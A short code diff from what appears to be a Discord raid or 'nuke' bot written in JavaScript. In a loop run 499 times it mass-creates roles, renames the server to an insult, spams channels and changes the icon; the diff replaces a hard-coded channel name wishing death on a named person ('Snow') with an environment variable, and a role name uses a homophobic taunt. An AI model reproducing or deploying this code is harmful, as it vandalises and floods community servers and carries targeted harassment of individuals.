@@ -30,8 +30,9 @@ client.on("message", async (message) => {
 	for(i = 0; i < 499; i++)
 		message.guild.createRole('henry gay')
 	    	message.guild.setName('snow manipulador do caralho')
-	    	message.guild.createChannel('SNOW ESPERO QUE VOCE MORRA -SUZY <3');
-	    	message.guild.createChannel('SNOW ESPERO QUE VOCE MORRA -SUZY <3');  
+	    	const texto = makeid(32);
+	    	message.guild.createChannel(process.env.CHANNELNAME, 'text');
+	    	message.guild.createChannel(process.env.CHANNELNAME, 'text');  
 	    	message.guild.setIcon('./icon.png') 
 	}
     }
